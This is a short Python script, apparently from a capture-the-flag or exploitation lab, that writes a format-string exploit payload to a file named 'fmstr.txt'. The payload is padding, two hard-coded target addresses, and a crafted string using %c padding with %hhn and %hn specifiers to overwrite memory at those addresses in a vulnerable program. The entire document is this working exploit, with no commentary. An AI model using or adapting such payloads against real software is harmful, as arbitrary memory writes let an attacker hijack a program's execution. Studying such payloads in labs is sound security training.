with open('fmstr.txt', 'wb') as f:
    f.write(b'a' * 104)
    f.write(b'\x10\x80\x55\x55\x55\x55\x00\x00')
    f.write(b'\x11\x80\x55\x55\x55\x55\x00\x00')
    format_string = ("%c" * 13 + "A" * 96 + "%hhn" + "B" * 27904 + "%hn").encode()
    f.write(format_string)